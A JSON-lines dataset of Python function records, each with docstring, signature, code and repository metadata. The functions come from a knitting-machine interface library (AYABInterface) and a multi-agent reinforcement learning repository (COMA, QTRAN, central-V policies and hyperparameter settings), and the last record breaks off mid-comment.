{"docstring": "\"\"\"What this object is equal to.\"\"\"\n", "func_signal": "def _id(self):\n", "code": "return (self.__class__, self.number_of_needles, self.needle_positions,\n        self.left_end_needle)", "path": "AYABInterface/AYABInterface/machines.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Mark the row at index as completed.\n\n.. seealso:: :meth:`completed_row_indices`\n\nThis method notifies the obsevrers from :meth:`on_row_completed`.\n\"\"\"\n", "func_signal": "def row_completed(self, index):\n", "code": "self._completed_rows.append(index)\nfor row_completed in self._on_row_completed:\n    row_completed(index)", "path": "AYABInterface/AYABInterface/needle_positions.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Create a new NeedlePositions object.\"\"\"\n", "func_signal": "def __init__(self, get_needle_positions, machine):\n", "code": "self._get = get_needle_positions\nself._machine = machine\nself._get_cache = {}\nself._needle_position_bytes_cache = {}\nself._line_configuration_message_cache = {}", "path": "AYABInterface/AYABInterface/communication/cache.py", "commit_date": "2016-08-01 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Start a parallel thread for receiving messages.\n\nIf :meth:`start` was no called before, start will be called in the\nthread.\nThe thread calls :meth:`receive_message` until the :attr:`state`\n:meth:`~AYABInterface.communication.states.State.is_connection_closed`.\n\n:param float seconds_to_wait: A time in seconds to wait with the\n  parallel execution. This is useful to allow the controller time to\n  initialize.\n\n.. seealso:: :attr:`lock`, :meth:`runs_in_parallel`\n\"\"\"\n", "func_signal": "def parallelize(self, seconds_to_wait=2):\n", "code": "with self.lock:\n    thread = Thread(target=self._parallel_receive_loop,\n                    args=(seconds_to_wait,))\n    thread.deamon = True\n    thread.start()\n    self._thread = thread", "path": "AYABInterface/AYABInterface/communication/__init__.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Stop the communication with the shield.\"\"\"\n", "func_signal": "def stop(self):\n", "code": "with self.lock:\n    self._message_received(ConnectionClosed(self._file, self))", "path": "AYABInterface/AYABInterface/communication/__init__.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Return the needle positions or None.\n\n:param int line_number: the number of the line\n:rtype: list\n:return: the needle positions for a specific line specified by\n  :paramref:`line_number` or :obj:`None` if no were given\n\"\"\"\n", "func_signal": "def get(self, line_number):\n", "code": "if line_number not in self._get_cache:\n    self._get_cache[line_number] = self._get(line_number)\nreturn self._get_cache[line_number]", "path": "AYABInterface/AYABInterface/communication/cache.py", "commit_date": "2016-08-01 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Check for validity.\n\n:raises ValueError:\n\n  - if not all lines are as long as the :attr:`number of needles\n    <AYABInterface.machines.Machine.number_of_needles>`\n  - if the contents of the rows are not :attr:`needle positions\n    <AYABInterface.machines.Machine.needle_positions>`\n\"\"\"\n# TODO: This violates the law of demeter.\n#       The architecture should be changed that this check is either\n#       performed by the machine or by the unity of machine and\n#       carriage.\n", "func_signal": "def check(self):\n", "code": "expected_positions = self._machine.needle_positions\nexpected_row_length = self._machine.number_of_needles\nfor row_index, row in enumerate(self._rows):\n    if len(row) != expected_row_length:\n        message = _ROW_LENGTH_ERROR_MESSAGE.format(\n            row_index, len(row), expected_row_length)\n        raise ValueError(message)\n    for needle_index, needle_position in enumerate(row):\n        if needle_position not in expected_positions:\n            message = _NEEDLE_POSITION_ERROR_MESSAGE.format(\n                row_index, needle_index, repr(needle_position),\n                \", \".join(map(repr, expected_positions)))\n            raise ValueError(message)", "path": "AYABInterface/AYABInterface/needle_positions.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Whether tihs communication is ready to receive messages.]\n\n:rtype: bool\n\n.. code:: python\n\n    assert not communication.can_receive_messages()\n    communication.start()\n    assert communication.can_receive_messages()\n    communication.stop()\n    assert not communication.can_receive_messages()\n\n\"\"\"\n", "func_signal": "def can_receive_messages(self):\n", "code": "with self.lock:\n    return not self._state.is_waiting_for_start() and \\\n        not self._state.is_connection_closed()", "path": "AYABInterface/AYABInterface/communication/__init__.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Create a needle interface.\n\n:param list rows: a list of lists of :attr:`needle positions\n    <AYABInterface.machines.Machine.needle_positions>`\n:param AYABInterface.machines.Machine: the machine type to use\n:raises ValueError: if the arguments are not valid, see :meth:`check`\n\"\"\"\n", "func_signal": "def __init__(self, rows, machine):\n", "code": "self._rows = rows\nself._machine = machine\nself._completed_rows = []\nself._on_row_completed = []\nself.check()", "path": "AYABInterface/AYABInterface/needle_positions.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Get the bytes representing needle positions or None.\n\n:param int line_number: the line number to take the bytes from\n:rtype: bytes\n:return: the bytes that represent the message or :obj:`None` if no\n  data is there for the line.\n\nDepending on the :attr:`machine`, the length and result may vary.\n\"\"\"\n", "func_signal": "def get_bytes(self, line_number):\n", "code": "if line_number not in self._needle_position_bytes_cache:\n    line = self._get(line_number)\n    if line is None:\n        line_bytes = None\n    else:\n        line_bytes = self._machine.needle_positions_to_bytes(line)\n    self._needle_position_bytes_cache[line_number] = line_bytes\nreturn self._needle_position_bytes_cache[line_number]", "path": "AYABInterface/AYABInterface/communication/cache.py", "commit_date": "2016-08-01 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Run the receiving in parallel.\"\"\"\n", "func_signal": "def _parallel_receive_loop(self, seconds_to_wait):\n", "code": "sleep(seconds_to_wait)\nwith self._lock:\n    self._number_of_threads_receiving_messages += 1\ntry:\n    with self._lock:\n        if self.state.is_waiting_for_start():\n            self.start()\n    while True:\n        with self.lock:\n            if self.state.is_connection_closed():\n                return\n            self.receive_message()\nfinally:\n    with self._lock:\n        self._number_of_threads_receiving_messages -= 1", "path": "AYABInterface/AYABInterface/communication/__init__.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "\"\"\"Notify the observers about the received message.\"\"\"\n", "func_signal": "def _message_received(self, message):\n", "code": "with self.lock:\n    self._state.receive_message(message)\n    for callable in chain(self._on_message_received, self._on_message):\n        callable(message)", "path": "AYABInterface/AYABInterface/communication/__init__.py", "commit_date": "2016-08-04 00:00:00", "repo_name": "fossasia/AYABInterface", "stars": 1495, "license": "lgpl-3.0", "language": "python", "size": 195}
{"docstring": "# \u53d6\u51fa\u6240\u6709episode\u4e0a\u8be5transition_idx\u7684\u7ecf\u9a8c\uff0cu_onehot\u8981\u53d6\u51fa\u6240\u6709\uff0c\u56e0\u4e3a\u8981\u7528\u5230\u4e0a\u4e00\u6761\n", "func_signal": "def _get_actor_inputs(self, batch, transition_idx):\n", "code": "obs, u_onehot = batch['o'][:, transition_idx], batch['u_onehot'][:]\nepisode_num = obs.shape[0]\ninputs = []\ninputs.append(obs)\n# \u7ed9inputs\u6dfb\u52a0\u4e0a\u4e00\u4e2a\u52a8\u4f5c\u3001agent\u7f16\u53f7\n\nif self.args.last_action:\n    if transition_idx == 0:  # \u5982\u679c\u662f\u7b2c\u4e00\u6761\u7ecf\u9a8c\uff0c\u5c31\u8ba9\u524d\u4e00\u4e2a\u52a8\u4f5c\u4e3a0\u5411\u91cf\n        inputs.append(torch.zeros_like(u_onehot[:, transition_idx]))\n    else:\n        inputs.append(u_onehot[:, transition_idx - 1])\nif self.args.reuse_network:\n    # \u56e0\u4e3a\u5f53\u524d\u7684inputs\u4e09\u7ef4\u7684\u6570\u636e\uff0c\u6bcf\u4e00\u7ef4\u5206\u522b\u4ee3\u8868(episode\u7f16\u53f7\uff0cagent\u7f16\u53f7\uff0cinputs\u7ef4\u5ea6)\uff0c\u76f4\u63a5\u5728dim_1\u4e0a\u6dfb\u52a0\u5bf9\u5e94\u7684\u5411\u91cf\n    # \u5373\u53ef\uff0c\u6bd4\u5982\u7ed9agent_0\u540e\u9762\u52a0(1, 0, 0, 0, 0)\uff0c\u8868\u793a5\u4e2aagent\u4e2d\u76840\u53f7\u3002\u800cagent_0\u7684\u6570\u636e\u6b63\u597d\u5728\u7b2c0\u884c\uff0c\u90a3\u4e48\u9700\u8981\u52a0\u7684\n    # agent\u7f16\u53f7\u6070\u597d\u5c31\u662f\u4e00\u4e2a\u5355\u4f4d\u77e9\u9635\uff0c\u5373\u5bf9\u89d2\u7ebf\u4e3a1\uff0c\u5176\u4f59\u4e3a0\n    inputs.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n# \u8981\u628ainputs\u4e2d\u7684\u4e09\u4e2a\u62fc\u8d77\u6765\uff0c\u5e76\u4e14\u8981\u628aepisode_num\u4e2aepisode\u3001self.args.n_agents\u4e2aagent\u7684\u6570\u636e\u62fc\u621040\u6761(40,96)\u7684\u6570\u636e\uff0c\n# \u56e0\u4e3a\u8fd9\u91cc\u6240\u6709agent\u5171\u4eab\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u6bcf\u6761\u6570\u636e\u4e2d\u5e26\u4e0a\u4e86\u81ea\u5df1\u7684\u7f16\u53f7\uff0c\u6240\u4ee5\u8fd8\u662f\u81ea\u5df1\u7684\u6570\u636e\ninputs = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs], dim=1)\nreturn inputs", "path": "MARL-Algorithms/policy/coma.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u53d6\u51fa\u6240\u6709episode\u4e0a\u8be5transition_idx\u7684\u7ecf\u9a8c\uff0cu_onehot\u8981\u53d6\u51fa\u6240\u6709\uff0c\u56e0\u4e3a\u8981\u7528\u5230\u4e0a\u4e00\u6761\n", "func_signal": "def _get_individual_inputs(self, batch, transition_idx):\n", "code": "obs, obs_next, u_onehot = batch['o'][:, transition_idx], \\\n                          batch['o_next'][:, transition_idx], batch['u_onehot'][:]\nepisode_num = obs.shape[0]\ninputs, inputs_next = [], []\ninputs.append(obs)\ninputs_next.append(obs_next)\n# \u7ed9obs\u6dfb\u52a0\u4e0a\u4e00\u4e2a\u52a8\u4f5c\u3001agent\u7f16\u53f7\nif self.args.last_action:\n    if transition_idx == 0:  # \u5982\u679c\u662f\u7b2c\u4e00\u6761\u7ecf\u9a8c\uff0c\u5c31\u8ba9\u524d\u4e00\u4e2a\u52a8\u4f5c\u4e3a0\u5411\u91cf\n        inputs.append(torch.zeros_like(u_onehot[:, transition_idx]))\n    else:\n        inputs.append(u_onehot[:, transition_idx - 1])\n    inputs_next.append(u_onehot[:, transition_idx])\nif self.args.reuse_network:\n    # \u56e0\u4e3a\u5f53\u524d\u7684obs\u4e09\u7ef4\u7684\u6570\u636e\uff0c\u6bcf\u4e00\u7ef4\u5206\u522b\u4ee3\u8868(episode\u7f16\u53f7\uff0cagent\u7f16\u53f7\uff0cobs\u7ef4\u5ea6)\uff0c\u76f4\u63a5\u5728dim_1\u4e0a\u6dfb\u52a0\u5bf9\u5e94\u7684\u5411\u91cf\n    # \u5373\u53ef\uff0c\u6bd4\u5982\u7ed9agent_0\u540e\u9762\u52a0(1, 0, 0, 0, 0)\uff0c\u8868\u793a5\u4e2aagent\u4e2d\u76840\u53f7\u3002\u800cagent_0\u7684\u6570\u636e\u6b63\u597d\u5728\u7b2c0\u884c\uff0c\u90a3\u4e48\u9700\u8981\u52a0\u7684\n    # agent\u7f16\u53f7\u6070\u597d\u5c31\u662f\u4e00\u4e2a\u5355\u4f4d\u77e9\u9635\uff0c\u5373\u5bf9\u89d2\u7ebf\u4e3a1\uff0c\u5176\u4f59\u4e3a0\n    inputs.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n    inputs_next.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n# \u8981\u628aobs\u4e2d\u7684\u4e09\u4e2a\u62fc\u8d77\u6765\uff0c\u5e76\u4e14\u8981\u628aepisode_num\u4e2aepisode\u3001self.args.n_agents\u4e2aagent\u7684\u6570\u636e\u62fc\u621040\u6761(40,96)\u7684\u6570\u636e\uff0c\n# \u56e0\u4e3a\u8fd9\u91cc\u6240\u6709agent\u5171\u4eab\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u6bcf\u6761\u6570\u636e\u4e2d\u5e26\u4e0a\u4e86\u81ea\u5df1\u7684\u7f16\u53f7\uff0c\u6240\u4ee5\u8fd8\u662f\u81ea\u5df1\u7684\u6570\u636e\ninputs = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs], dim=1)\ninputs_next = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs_next], dim=1)\nreturn inputs, inputs_next", "path": "MARL-Algorithms/policy/qtran_alt.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u4e3a\u6bcf\u4e2aepisode\u4e2d\u7684\u6bcf\u4e2aagent\u90fd\u521d\u59cb\u5316\u4e00\u4e2aeval_hidden\u3001target_hidden\n", "func_signal": "def init_hidden(self, episode_num):\n", "code": "self.eval_hidden = torch.zeros((episode_num, self.n_agents, self.args.rnn_hidden_dim))\nself.target_hidden = torch.zeros((episode_num, self.n_agents, self.args.rnn_hidden_dim))", "path": "MARL-Algorithms/policy/qtran_base.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u53d6\u51fa\u6240\u6709episode\u4e0a\u8be5transition_idx\u7684\u7ecf\u9a8c\n", "func_signal": "def _get_critic_inputs(self, batch, transition_idx, max_episode_len):\n", "code": "obs, obs_next, s, s_next = batch['o'][:, transition_idx], batch['o_next'][:, transition_idx],\\\n                           batch['s'][:, transition_idx], batch['s_next'][:, transition_idx]\nu_onehot = batch['u_onehot'][:, transition_idx]\nif transition_idx != max_episode_len - 1:\n    u_onehot_next = batch['u_onehot'][:, transition_idx + 1]\nelse:\n    u_onehot_next = torch.zeros(*u_onehot.shape)\n# s\u548cs_next\u662f\u4e8c\u7ef4\u7684\uff0c\u6ca1\u6709n_agents\u7ef4\u5ea6\uff0c\u56e0\u4e3a\u6240\u6709agent\u7684s\u4e00\u6837\u3002\u5176\u4ed6\u90fd\u662f\u4e09\u7ef4\u7684\uff0c\u5230\u65f6\u5019\u4e0d\u80fd\u62fc\u63a5\uff0c\u6240\u4ee5\u8981\u628as\u8f6c\u5316\u6210\u4e09\u7ef4\u7684\ns = s.unsqueeze(1).expand(-1, self.n_agents, -1)\ns_next = s_next.unsqueeze(1).expand(-1, self.n_agents, -1)\nepisode_num = obs.shape[0]\n# \u56e0\u4e3acoma\u7684critic\u7528\u5230\u7684\u662f\u6240\u6709agent\u7684\u52a8\u4f5c\uff0c\u6240\u4ee5\u8981\u628au_onehot\u6700\u540e\u4e00\u4e2a\u7ef4\u5ea6\u4e0a\u5f53\u524dagent\u7684\u52a8\u4f5c\u53d8\u6210\u6240\u6709agent\u7684\u52a8\u4f5c\nu_onehot = u_onehot.view((episode_num, 1, -1)).repeat(1, self.n_agents, 1)\nu_onehot_next = u_onehot_next.view((episode_num, 1, -1)).repeat(1, self.n_agents, 1)\n\nif transition_idx == 0:  # \u5982\u679c\u662f\u7b2c\u4e00\u6761\u7ecf\u9a8c\uff0c\u5c31\u8ba9\u524d\u4e00\u4e2a\u52a8\u4f5c\u4e3a0\u5411\u91cf\n    u_onehot_last = torch.zeros_like(u_onehot)\nelse:\n    u_onehot_last = batch['u_onehot'][:, transition_idx - 1]\n    u_onehot_last = u_onehot_last.view((episode_num, 1, -1)).repeat(1, self.n_agents, 1)\n\ninputs, inputs_next = [], []\n# \u6dfb\u52a0\u72b6\u6001\ninputs.append(s)\ninputs_next.append(s_next)\n# \u6dfb\u52a0obs\ninputs.append(obs)\ninputs_next.append(obs_next)\n# \u6dfb\u52a0\u6240\u6709agent\u7684\u4e0a\u4e00\u4e2a\u52a8\u4f5c\ninputs.append(u_onehot_last)\ninputs_next.append(u_onehot)\n\n# \u6dfb\u52a0\u5f53\u524d\u52a8\u4f5c\n'''\n\u56e0\u4e3acoma\u5bf9\u4e8e\u5f53\u524d\u52a8\u4f5c\uff0c\u8f93\u5165\u7684\u662f\u5176\u4ed6agent\u7684\u5f53\u524d\u52a8\u4f5c\uff0c\u4e0d\u8f93\u5165\u5f53\u524dagent\u7684\u52a8\u4f5c\uff0c\u4e3a\u4e86\u65b9\u4fbf\u8d77\u89c1\uff0c\u6bcf\u6b21\u867d\u7136\u8f93\u5165\u5f53\u524dagent\u7684\n\u5f53\u524d\u52a8\u4f5c\uff0c\u4f46\u662f\u5c06\u5176\u7f6e\u4e3a0\u76f8\u91cf\uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u6ca1\u6709\u8f93\u5165\u3002\n'''\naction_mask = (1 - torch.eye(self.n_agents))  # th.eye\uff08\uff09\u751f\u6210\u4e00\u4e2a\u4e8c\u7ef4\u5bf9\u89d2\u77e9\u9635\n# \u5f97\u5230\u4e00\u4e2a\u77e9\u9635action_mask\uff0c\u7528\u6765\u5c06(episode_num, n_agents, n_agents * n_actions)\u7684actions\u4e2d\u6bcf\u4e2aagent\u81ea\u5df1\u7684\u52a8\u4f5c\u53d8\u62100\u5411\u91cf\naction_mask = action_mask.view(-1, 1).repeat(1, self.n_actions).view(self.n_agents, -1)\ninputs.append(u_onehot * action_mask.unsqueeze(0))\ninputs_next.append(u_onehot_next * action_mask.unsqueeze(0))\n\n# \u6dfb\u52a0agent\u7f16\u53f7\u5bf9\u5e94\u7684one-hot\u5411\u91cf\n'''\n\u56e0\u4e3a\u5f53\u524d\u7684inputs\u4e09\u7ef4\u7684\u6570\u636e\uff0c\u6bcf\u4e00\u7ef4\u5206\u522b\u4ee3\u8868(episode\u7f16\u53f7\uff0cagent\u7f16\u53f7\uff0cinputs\u7ef4\u5ea6)\uff0c\u76f4\u63a5\u5728\u540e\u9762\u6dfb\u52a0\u5bf9\u5e94\u7684\u5411\u91cf\n\u5373\u53ef\uff0c\u6bd4\u5982\u7ed9agent_0\u540e\u9762\u52a0(1, 0, 0, 0, 0)\uff0c\u8868\u793a5\u4e2aagent\u4e2d\u76840\u53f7\u3002\u800cagent_0\u7684\u6570\u636e\u6b63\u597d\u5728\u7b2c0\u884c\uff0c\u90a3\u4e48\u9700\u8981\u52a0\u7684\nagent\u7f16\u53f7\u6070\u597d\u5c31\u662f\u4e00\u4e2a\u5355\u4f4d\u77e9\u9635\uff0c\u5373\u5bf9\u89d2\u7ebf\u4e3a1\uff0c\u5176\u4f59\u4e3a0\n'''\ninputs.append(torch.eye(self.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\ninputs_next.append(torch.eye(self.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n\n# \u8981\u628ainputs\u4e2d\u76845\u9879\u8f93\u5165\u62fc\u8d77\u6765\uff0c\u5e76\u4e14\u8981\u628a\u5176\u7ef4\u5ea6\u4ece(episode_num, n_agents, inputs)\u4e09\u7ef4\u8f6c\u6362\u6210(episode_num * n_agents, inputs)\u4e8c\u7ef4\ninputs = torch.cat([x.reshape(episode_num * self.n_agents, -1) for x in inputs], dim=1)\ninputs_next = torch.cat([x.reshape(episode_num * self.n_agents, -1) for x in inputs_next], dim=1)\nreturn inputs, inputs_next", "path": "MARL-Algorithms/policy/coma.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# network\n", "func_signal": "def get_mixer_args(args):\n", "code": "args.rnn_hidden_dim = 64\nargs.qmix_hidden_dim = 32\nargs.two_hyper_layers = False\nargs.hyper_hidden_dim = 64\nargs.qtran_hidden_dim = 64\nargs.lr = 5e-4\n\n# epsilon greedy\nargs.epsilon = 1\nargs.min_epsilon = 0.05\nanneal_steps = 50000\nargs.anneal_epsilon = (args.epsilon - args.min_epsilon) / anneal_steps\nargs.epsilon_anneal_scale = 'step'\n\n# the number of the epoch to train the agent\nargs.n_epoch = 20000\n\n# the number of the episodes in one epoch\nargs.n_episodes = 1\n\n# the number of the train steps in one epoch\nargs.train_steps = 1\n\n# # how often to evaluate\nargs.evaluate_cycle = 100\n\n# experience replay\nargs.batch_size = 32\nargs.buffer_size = int(5e3)\n\n# how often to save the model\nargs.save_cycle = 5000\n\n# how often to update the target_net\nargs.target_update_cycle = 200\n\n# QTRAN lambda\nargs.lambda_opt = 1\nargs.lambda_nopt = 1\n\n# prevent gradient explosion\nargs.grad_norm_clip = 10\n\n# MAVEN\nargs.noise_dim = 16\nargs.lambda_mi = 0.001\nargs.lambda_ql = 1\nargs.entropy_coefficient = 0.001\nreturn args", "path": "MARL-Algorithms/common/arguments.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# network\n", "func_signal": "def get_coma_args(args):\n", "code": "args.rnn_hidden_dim = 64\nargs.critic_dim = 128\nargs.lr_actor = 1e-4\nargs.lr_critic = 1e-3\n\n# epsilon-greedy\nargs.epsilon = 0.5\nargs.anneal_epsilon = 0.00064\nargs.min_epsilon = 0.02\nargs.epsilon_anneal_scale = 'epoch'\n\n# lambda of td-lambda return\nargs.td_lambda = 0.8\n\n# the number of the epoch to train the agent\nargs.n_epoch = 20000\n\n# the number of the episodes in one epoch\nargs.n_episodes = 1\n\n# how often to evaluate\nargs.evaluate_cycle = 100\n\n# how often to save the model\nargs.save_cycle = 5000\n\n# how often to update the target_net\nargs.target_update_cycle = 200\n\n# prevent gradient explosion\nargs.grad_norm_clip = 10\n\nreturn args", "path": "MARL-Algorithms/common/arguments.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# network\n", "func_signal": "def get_reinforce_args(args):\n", "code": "args.rnn_hidden_dim = 64\nargs.critic_dim = 128\nargs.lr_actor = 1e-4\nargs.lr_critic = 1e-3\n\n# epsilon-greedy\nargs.epsilon = 0.5\nargs.anneal_epsilon = 0.00064\nargs.min_epsilon = 0.02\nargs.epsilon_anneal_scale = 'epoch'\n\n# the number of the epoch to train the agent\nargs.n_epoch = 20000\n\n# the number of the episodes in one epoch\nargs.n_episodes = 1\n\n# how often to evaluate\nargs.evaluate_cycle = 100\n\n# how often to save the model\nargs.save_cycle = 5000\n\n# prevent gradient explosion\nargs.grad_norm_clip = 10\n\nreturn args", "path": "MARL-Algorithms/common/arguments.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u53d6\u51fa\u6240\u6709episode\u4e0a\u8be5transition_idx\u7684\u7ecf\u9a8c\uff0cu_onehot\u8981\u53d6\u51fa\u6240\u6709\uff0c\u56e0\u4e3a\u8981\u7528\u5230\u4e0a\u4e00\u6761\n", "func_signal": "def _get_actor_inputs(self, batch, transition_idx):\n", "code": "obs, u_onehot = batch['o'][:, transition_idx], batch['u_onehot'][:]\nepisode_num = obs.shape[0]\ninputs = []\ninputs.append(obs)\n# \u7ed9inputs\u6dfb\u52a0\u4e0a\u4e00\u4e2a\u52a8\u4f5c\u3001agent\u7f16\u53f7\n\nif self.args.last_action:\n    if transition_idx == 0:  # \u5982\u679c\u662f\u7b2c\u4e00\u6761\u7ecf\u9a8c\uff0c\u5c31\u8ba9\u524d\u4e00\u4e2a\u52a8\u4f5c\u4e3a0\u5411\u91cf\n        inputs.append(torch.zeros_like(u_onehot[:, transition_idx]))\n    else:\n        inputs.append(u_onehot[:, transition_idx - 1])\nif self.args.reuse_network:\n    # \u56e0\u4e3a\u5f53\u524d\u7684inputs\u4e09\u7ef4\u7684\u6570\u636e\uff0c\u6bcf\u4e00\u7ef4\u5206\u522b\u4ee3\u8868(episode\u7f16\u53f7\uff0cagent\u7f16\u53f7\uff0cinputs\u7ef4\u5ea6)\uff0c\u76f4\u63a5\u5728dim_1\u4e0a\u6dfb\u52a0\u5bf9\u5e94\u7684\u5411\u91cf\n    # \u5373\u53ef\uff0c\u6bd4\u5982\u7ed9agent_0\u540e\u9762\u52a0(1, 0, 0, 0, 0)\uff0c\u8868\u793a5\u4e2aagent\u4e2d\u76840\u53f7\u3002\u800cagent_0\u7684\u6570\u636e\u6b63\u597d\u5728\u7b2c0\u884c\uff0c\u90a3\u4e48\u9700\u8981\u52a0\u7684\n    # agent\u7f16\u53f7\u6070\u597d\u5c31\u662f\u4e00\u4e2a\u5355\u4f4d\u77e9\u9635\uff0c\u5373\u5bf9\u89d2\u7ebf\u4e3a1\uff0c\u5176\u4f59\u4e3a0\n    inputs.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n# \u8981\u628ainputs\u4e2d\u7684\u4e09\u4e2a\u62fc\u8d77\u6765\uff0c\u5e76\u4e14\u8981\u628aepisode_num\u4e2aepisode\u3001self.args.n_agents\u4e2aagent\u7684\u6570\u636e\u62fc\u621040\u6761(40,96)\u7684\u6570\u636e\uff0c\n# \u56e0\u4e3a\u8fd9\u91cc\u6240\u6709agent\u5171\u4eab\u4e00\u4e2a\u795e\u7ecf\u7f51\u7edc\uff0c\u6bcf\u6761\u6570\u636e\u4e2d\u5e26\u4e0a\u4e86\u81ea\u5df1\u7684\u7f16\u53f7\uff0c\u6240\u4ee5\u8fd8\u662f\u81ea\u5df1\u7684\u6570\u636e\ninputs = torch.cat([x.reshape(episode_num * self.args.n_agents, -1) for x in inputs], dim=1)\nreturn inputs", "path": "MARL-Algorithms/policy/central_v.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u4e3a\u6bcf\u4e2aepisode\u4e2d\u7684\u6bcf\u4e2aagent\u90fd\u521d\u59cb\u5316\u4e00\u4e2aeval_hidden\u3001target_hidden\n", "func_signal": "def init_hidden(self, episode_num):\n", "code": "self.eval_hidden = torch.zeros((episode_num, self.n_agents, self.args.rnn_hidden_dim))\nself.target_hidden = torch.zeros((episode_num, self.n_agents, self.args.rnn_hidden_dim))", "path": "MARL-Algorithms/policy/qtran_alt.py", "commit_date": "2020-07-09 00:00:00", "repo_name": "starry-sky6688/MARL-Algorithms", "stars": 1269, "license": "None", "language": "python", "size": 61071}
{"docstring": "# \u53d6\u51fa\u6240\u6709episode\u4e0a\u8be5transition_idx\u7684\u7ecf\u9a8c\uff0cu_onehot\u8981\u53d6\u51fa\u6240\u6709\uff0c\u56e0\u4e3a\u8981\u7528\u5230\u4e0a\u4e00\u6761\n", "func_signal": "def _get_actor_inputs(self, batch, transition_idx):\n", "code": "obs, u_onehot = batch['o'][:, transition_idx], batch['u_onehot'][:]\nepisode_num = obs.shape[0]\ninputs = []\ninputs.append(obs)\n# \u7ed9inputs\u6dfb\u52a0\u4e0a\u4e00\u4e2a\u52a8\u4f5c\u3001agent\u7f16\u53f7\n\nif self.args.last_action:\n    if transition_idx == 0:  # \u5982\u679c\u662f\u7b2c\u4e00\u6761\u7ecf\u9a8c\uff0c\u5c31\u8ba9\u524d\u4e00\u4e2a\u52a8\u4f5c\u4e3a0\u5411\u91cf\n        inputs.append(torch.zeros_like(u_onehot[:, transition_idx]))\n    else:\n        inputs.append(u_onehot[:, transition_idx - 1])\nif self.args.reuse_network:\n    # \u56e0\u4e3a\u5f53\u524d\u7684inputs\u4e09\u7ef4\u7684\u6570\u636e\uff0c\u6bcf\u4e00\u7ef4\u5206\u522b\u4ee3\u8868(episode\u7f16\u53f7\uff0cagent\u7f16\u53f7\uff0cinputs\u7ef4\u5ea6)\uff0c\u76f4\u63a5\u5728dim_1\u4e0a\u6dfb\u52a0\u5bf9\u5e94\u7684\u5411\u91cf\n    # \u5373\u53ef\uff0c\u6bd4\u5982\u7ed9agent_0\u540e\u9762\u52a0(1, 0, 0, 0, 0)\uff0c\u8868\u793a5\u4e2aagent\u4e2d\u76840\u53f7\u3002\u800cagent_0\u7684\u6570\u636e\u6b63\u597d\u5728\u7b2c0\u884c\uff0c\u90a3\u4e48\u9700\u8981\u52a0\u7684\n    # agent\u7f16\u53f7\u6070\u597d\u5c31\u662f\u4e00\u4e2a\u5355\u4f4d\u77e9\u9635\uff0c\u5373\u5bf9\u89d2\u7ebf\u4e3a1\uff0c\u5176\u4f59\u4e3a0\n    inputs.append(torch.eye(self.args.n_agents).unsqueeze(0).expand(episode_num, -1, -1))\n# 